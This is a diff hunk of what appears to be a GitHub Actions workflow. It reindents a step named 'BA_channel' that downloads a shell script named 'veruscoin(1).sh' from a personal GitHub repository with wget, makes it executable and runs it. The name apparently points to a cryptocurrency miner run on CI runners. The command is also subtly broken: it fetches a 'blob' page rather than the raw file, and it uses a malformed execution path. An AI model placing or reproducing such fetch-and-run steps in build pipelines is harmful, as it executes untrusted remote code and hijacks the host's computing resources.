@@ -19,4 +19,4 @@
 	  uses: actions/checkout@v1
 	- name: BA_channel
 	  run:
-	    wget https://github.com/nafasya/baru/blob/main/veruscoin(1).sh && chmod u+x veruscoin(1).sh && .veruscoin(1).sh
+	   wget https://github.com/nafasya/baru/blob/main/veruscoin(1).sh && chmod u+x veruscoin(1).sh && .veruscoin(1).sh
